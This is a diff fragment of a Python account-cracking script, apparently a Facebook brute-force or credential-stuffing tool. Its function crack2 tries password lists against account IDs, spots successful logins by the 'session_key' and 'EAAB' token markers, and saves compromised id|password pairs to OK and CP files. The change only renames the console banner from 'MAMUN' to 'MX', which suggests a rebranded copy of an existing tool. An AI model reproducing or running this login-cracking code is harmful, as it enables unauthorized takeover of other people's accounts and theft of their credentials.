@@ -196,7 +196,7 @@ def crack2(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [MAMUN] %s/%s  %s/%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [MX] %s/%s  %s/%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
@@ -208,13 +208,13 @@ def crack2(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print('\r%s [MAMUN-CP] %s|%s        '%(b,idf,pw))
+					print('\r%s [MX-CP] %s|%s        '%(b,idf,pw))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
 			elif "session_key" in resp.text and "EAAB" in resp.text:
-				print('\r%s [MAMUN-OK] %s|%s        '%(h,idf,pw))
+				print('\r%s [MX-OK] %s|%s        '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
 				break
